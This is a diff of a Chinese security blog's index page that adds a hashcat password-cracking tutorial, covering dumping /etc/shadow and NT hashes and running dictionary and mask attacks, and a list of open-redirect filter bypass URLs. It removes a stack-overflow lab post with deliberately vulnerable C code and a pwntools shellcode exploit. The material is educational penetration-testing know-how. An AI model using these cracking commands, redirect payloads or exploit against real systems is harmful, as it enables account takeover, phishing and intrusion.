@@ -258,6 +258,403 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/28/哈希密码爆破工具hashcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/28/哈希密码爆破工具hashcat/" itemprop="url">
+                  哈希密码爆破工具hashcat
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-28T22:14:26+08:00">
+                2020-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/28/哈希密码爆破工具hashcat/" class="leancloud_visitors" data-flag-title="哈希密码爆破工具hashcat">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hashcat是世界上最快，最先进的密码恢复实用程序，为300多种高度优化的哈希算法提供了五种独特的攻击模式。hashcat支持Linux，Windows和macOS平台，且支持使用CPU，GPU和其他硬件加速器计算，并具有分布式密码破解的功能。</p>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>经典字典破解用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">hashcat testHashfile --hash-type 0 --attack-mode 0 passDic.txt</span><br><span class="line">-m，--hash-type选择哈希类型，</span><br><span class="line">1000为windows nt hash,1800是sha512 Linux加密,不指定-m默认为0即md5。</span><br><span class="line">-a，--attack-mode选择模式</span><br><span class="line">0 = Straight （字典破解）</span><br><span class="line">1 = Combination （组合破解）</span><br><span class="line">2 = Toggle-Case （大小写转换）</span><br><span class="line">3 = Brute-force（掩码暴力破解）</span><br><span class="line">4 = Permutation（序列破解）</span><br><span class="line">5 = Table-Lookup（查表破解）</span><br><span class="line">6 = Hybrid dict + mask 字典加掩码破解</span><br><span class="line">7 = Hybrid mask + dict 掩码+字典破解</span><br><span class="line">8 = Prince（王子破解）</span><br><span class="line">-b, --benchmark   测试计算机破解速度和显示硬件相关信息</span><br><span class="line">-h，--help   帮助，可查看hashcat各参数的用法和可供破解的哈希类型编号</span><br><span class="line">--quiet    静默模式, 抑制输出</span><br><span class="line">-n, --threads=NUM    线程数</span><br><span class="line">-o,  --outfile=FILE    定义哈希文件恢复输出文件</span><br><span class="line">--outfile-format=NUM    定义哈希文件输出格式，见下面的参考资料</span><br><span class="line">--outfile-autohex-disable    禁止使用十六进制输出明文</span><br><span class="line">--hex-salt    salt值是用十六进制给出的</span><br><span class="line">--hex-charset    设定字符集是十六进制给出</span><br><span class="line">--runtime=NUM    运行数秒（NUM值）后的中止会话</span><br><span class="line">--status    启用状态屏幕的自动更新</span><br><span class="line">--status-timer=NUM    状态屏幕更新秒值</span><br><span class="line">--status-automat    以机器可读的格式显示状态视图</span><br><span class="line">--session   后跟会话名称，主要用于中止任务后的恢复破解。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">内置的字符集:</span><br><span class="line">?l = abcdefghijklmnopqrstuvwxyz 代表小写字母</span><br><span class="line">?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ 代表大写字母</span><br><span class="line">?d = 0123456789 代表数字</span><br><span class="line">?s = !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~  代表特殊字符</span><br><span class="line">?a = ?l?u?d?s 大小写数字及特殊字符的组合</span><br><span class="line">?b = 0x00 - 0xff</span><br></pre></td></tr></table></figure></p>
+<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>本文使用最常用的两种加密：linux系统密码（sha512）和windows系统密码（NT<br> HASH）做实例，并使用最常用的两种攻击方式进行演示。</p>
+<h3 id="字典破解linux系统密码"><a href="#字典破解linux系统密码" class="headerlink" title="字典破解linux系统密码"></a>字典破解linux系统密码</h3><p>查看linux hash的方式是打开/etc/shadow直接查看，/etc/shadow文件中每一行代表一个用户以及其密码hash以及密码配置信息，以如下格式分布。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.:18443:0:99999:7:::</span><br><span class="line"></span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure>
+<p>其他字段都较好理解，其中加密密码和最后一次修改时间需要解释一下：</p>
+<p>加密密码中如果第一个字符为!或者*的话，说明这是一个不能登录的账户，其他情况格式为$id$salt$encrypted</p>
+<p>根据id可以判断加密方式，第二个$到第三个$之间的字段为salt，第三个$之后的字段为密码hash。</p>
+<p>常见的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id为1时，采用md5算法加密</span><br><span class="line">id为5时，采用SHA256算法加密</span><br><span class="line">id为6时，采用SHA512算法加密</span><br></pre></td></tr></table></figure></p>
+<p>最后一次修改时间是从1970-01-01开始计算的，每天加1，所以会显示为这样一个数字，我们可使用如下命令计算修改时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# date -d &quot;1970-01-01 18443 days&quot;</span><br><span class="line">2020年 06月 30日 星期二 00:00:00 CST</span><br></pre></td></tr></table></figure></p>
+<p>了解了linux系统密码保存的情况，就可以提取出来使用hashcat破解，我们需要提取第二个冒号到第三个冒号之间的字段保存到一个文件root.txt中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.</span><br></pre></td></tr></table></figure></p>
+<p>然后使用准备好的字典top100.txt破解，将破解结果保存在result.txt中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 -a 0 -o result.txt root.txt top100.txt --force</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/hashcat/hashcat01.png" alt=""></p>
+<h3 id="掩码破解windows用户密码"><a href="#掩码破解windows用户密码" class="headerlink" title="掩码破解windows用户密码"></a>掩码破解windows用户密码</h3><p>查看windows hash的工具非常多，为了省事我直接使用前面文章介绍过的工具LaZagne 就不重复介绍新工具了 <a href="http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p>
+<p>提取到windows hash如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test:1005:aad3b435b51404eeaad3b435b51404ee:f9e37e83b83c47a93c2f09f66408631b:::</span><br><span class="line"></span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br></pre></td></tr></table></figure>
+<p>我们需要提取后方的NT-HASH用来破解，即f9e37e83b83c47a93c2f09f66408631b存入test.txt，由于我设置的是三位字母三位数字的密码，使用如下掩码进行爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 -a 3 -o result4.txt test.txt ?l?l?l?d?d?d --force</span><br></pre></td></tr></table></figure>
+<p>可以很快得到结果</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/hashcat/hashcat01.png" alt=""></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">https://github.com/hashcat/hashcat</a></li>
+<li><a href="https://www.freebuf.com/sectool/164507.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164507.html</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/27/url重定向漏洞绕过方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/27/url重定向漏洞绕过方式总结/" itemprop="url">
+                  url重定向漏洞绕过方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-27T21:13:59+08:00">
+                2020-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/27/url重定向漏洞绕过方式总结/" class="leancloud_visitors" data-flag-title="url重定向漏洞绕过方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="url重定向漏洞"><a href="#url重定向漏洞" class="headerlink" title="url重定向漏洞"></a>url重定向漏洞</h2><p>URL重定向（URL redirection，或称网址重定向或网域名称转址），是指当使用者浏览某个网址时，将他导向到另一个网址的技术。而url重定向漏洞产生的原因是这个网址可控且没有做足够的校验，导致网站接受恶意用户输入的链接，跳转到一个攻击者控制的网站，而攻击者控制的网站往往是一个钓鱼页面，用于骗取用户的个人信息和登录口令。 </p>
+<h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>存在漏洞的url往往都具有以下格式：</p>
+<p><a href="http://www.example.com/xxx?server=http://www.example.com/yyy" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.example.com/yyy</a></p>
+<p>后面的url就是其跳转的url，一般由于regist、login、logout这些位置在操作完之后都会有跳转操作，url跳转漏洞也多出现于这类位置。</p>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="检测是否存在信任域名绕过"><a href="#检测是否存在信任域名绕过" class="headerlink" title="检测是否存在信任域名绕过"></a>检测是否存在信任域名绕过</h3><p>由于过滤机制往往只检查后面url是否包含信任域名，所以可构造如下url进行绕过：</p>
+<p><a href="http://www.example.com/xxx?server=http://www.example.com.hack.com/hack.html" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.example.com.hack.com/hack.html</a></p>
+<p>hack.com是攻击者网站，攻击者在hack.com中构造<a href="http://www.example.com.hack.com的解析且http://hack.com/hack.html" target="_blank" rel="noopener">www.example.com.hack.com的解析且http://hack.com/hack.html</a> 页面为攻击页面即可。</p>
+<p><a href="http://www.example.com/xxx?server=http://hack.com/www.example.com/" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://hack.com/www.example.com/</a></p>
+<p>hack.com是攻击者网站，攻击者在hack.com中构造<a href="http://hack.com/www.example.com/" target="_blank" rel="noopener">http://hack.com/www.example.com/</a> 页面为攻击页面即可。</p>
+<h3 id="多次重定向绕过"><a href="#多次重定向绕过" class="headerlink" title="多次重定向绕过"></a>多次重定向绕过</h3><p>某些过滤机制可以允许跳转某些信任站点如 baidu.com，如果存在这种情况，可以使用多重跳转来规避过滤机制。</p>
+<p><a href="http://www.example.com/xxx?server=https://www.baidu.com/link?url=fIqZTSHDWy6_CvKi0jDIAa8ZKUKwrwhQlmYecokJ9gy" target="_blank" rel="noopener">http://www.example.com/xxx?server=https://www.baidu.com/link?url=fIqZTSHDWy6_CvKi0jDIAa8ZKUKwrwhQlmYecokJ9gy</a></p>
+<p>link?url= 是百度的默认跳转方式，后面是百度的缓存链接，上面链接的缓存是google页面，此url可通过百度二次跳转到谷歌。</p>
+<h3 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h3><p>以下例子中，<a href="http://www.example.com为可信网站，www.hack.com为恶意网站" target="_blank" rel="noopener">www.example.com为可信网站，www.hack.com为恶意网站</a></p>
+<p>@绕过</p>
+<p><a href="http://www.example.com/xxx?server=http://www.example.com@www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.example.com@www.hack.com</a></p>
+<p>/绕过</p>
+<p><a href="http://www.example.com/xxx?server=/www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=/www.hack.com</a></p>
+<p>//绕过</p>
+<p><a href="http://www.example.com/xxx?server=//www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=//www.hack.com</a></p>
+<p>////绕过</p>
+<p><a href="http://www.example.com/xxx?server=////www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=////www.hack.com</a></p>
+<p>\绕过</p>
+<p><a href="http://www.example.com/xxx?server=http://www.hack.com\www.example.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.hack.com\www.example.com</a></p>
+<p>#绕过</p>
+<p><a href="http://www.example.com/xxx?server=http://www.hack.com#www.example.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.hack.com#www.example.com</a></p>
+<p>?绕过</p>
+<p><a href="http://www.example.com/xxx?server=http://www.hack.com?www.example.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.hack.com?www.example.com</a></p>
+<p>.绕过</p>
+<p><a href="http://www.example.com/xxx?server=.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=.hack.com</a></p>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><p>跳转地址白名单化</p>
+<p>如无法使用白名单，要合理校验跳转地址，限制绕过手段</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/16/csv注入利用和绕过总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1859,393 +2256,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/24/栈溢出之ret2shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/24/栈溢出之ret2shellcode/" itemprop="url">
-                  栈溢出之ret2shellcode
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-24T19:50:36+08:00">
-                2020-02-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/24/栈溢出之ret2shellcode/" class="leancloud_visitors" data-flag-title="栈溢出之ret2shellcode">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇博客讲到的ret2text中，我们利用了程序中已有的sys函数中的恶意代码来进行getshell，而实际情况中很可能没有这种代码，我们就需要自己拼接或构造恶意代码。这篇文章就讲另一种方式，使用填充shellcode的方法构造恶意代码。</p>
-<h2 id="ret2shellcode原理"><a href="#ret2shellcode原理" class="headerlink" title="ret2shellcode原理"></a>ret2shellcode原理</h2><p>ret2shellcode，即控制程序执行shellcode代码，shellcode需要放在一个可执行区域，然后通过返回地址找到这个地方执行填充好的恶意代码，获取shell。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>我们手动码一个带栈溢出问题的程序，这个程序有一个子函数func，func中gets位置存在栈溢出，并且程序有一个全局变量buf。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">char buf[128];</span><br><span class="line"></span><br><span class="line">int func()&#123;</span><br><span class="line">	char msg[100];</span><br><span class="line">	gets(msg);</span><br><span class="line">	strcpy(buf,msg);</span><br><span class="line">	puts(msg);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果要在内存空间中执行代码，我们需要关闭之前linux程序保护机制一文中提到的NX保护机制来构造一个环境。<br>在gcc编译过程中加入-z execstack参数使其关闭NX保护机制，并打开-g调试选项，使用如下方式进行编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -no-pie -z execstack -o ret2shellcode64 ret2shellcode.c</span><br></pre></td></tr></table></figure></p>
-<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>首先我们将程序gdb中，使用checksec查看一下安全机制（养成习惯）</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode01.png" alt=""></p>
-<p>分析程序，由于gets(msg)位置很明显有栈溢出，所以就是需要找一个目标地址来执行恶意代码获取shell，但是本题目中没有另一个子函数，却有一个全局变量buf，msg的内容会被拷贝到buf中，根据ret2shellcode的原理，我们能放下很长一段shellcode的地址也只有这个buf了，所以需要想办法构造溢出填充返回地址指向全局变量buf，且strcpy过程填充buf为shellcode。</p>
-<p>所以我们需要的信息有以下几点：<br>1.全局变量buf的地址<br>2.局部变量msg的地址<br>3.func函数的返回地址</p>
-<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息</p>
-<p>1.在第char msg[]处下个断点调试，运行程序到func内,并打印全局变量buf、局部变量msg，的地址和此时rbp的地址。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode02.png" alt=""></p>
-<p>2.使用vmmap查看全局变量buf所在位置是否具有可写权限。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode03.png" alt=""></p>
-<p>此时找到局部变量msg的地址是0xffe210，rbp的地址是0xffe280，全局变量buf的地址是0x404060，那么64位程序func返回地址就是0xffe288，且从vmmap结果可以得到全局变量中具有可执行权限。</p>
-<p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p>
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们要填充局部变量msg，这部分填充会被拷贝到buf中，所以要先填充shellcode，然后再填充一部分字符，使其使其占用空间直到返回地址，然后再将后面八个字节的位置填充为全局变量buf的地址0x404060，就可以使程序跳转到我们构造好的恶意代码处执行。</p>
-<p>加上shellcode的总偏移长度是返回地址减去局部变量地址，得到0x78=120</p>
-<p>这个总偏移长度要被shellcode和填充占满，后面的填充好说，前面的shellcode需要我们通过二进制数据模拟一个shell出来，这对于初学者来说稍微有些困难，我们可以通过编译好一个system(“/bin/sh”)程序来获取，也可以网上查找，最方便的办法还是用之前介绍过的pwntoolsshellcode模块直接生成。</p>
-<p>shellcode = asm(shellcraft.amd64.linux.sh())<br>payload = shellcode.ljust(120, ‘A’)+p64(0x404060)</p>
-<p>然后写出exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2shellcode64&quot;)</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(),arch=&quot;amd64&quot;)</span><br><span class="line">payload = shellcode.ljust(120, &apos;A&apos;)+p64(0x404060)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure></p>
-<p>执行exp即可获取shell</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2shellcode04.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/22/栈溢出之ret2text/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/22/栈溢出之ret2text/" itemprop="url">
-                  栈溢出之ret2text
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-22T20:25:02+08:00">
-                2020-02-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/22/栈溢出之ret2text/" class="leancloud_visitors" data-flag-title="栈溢出之ret2text">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
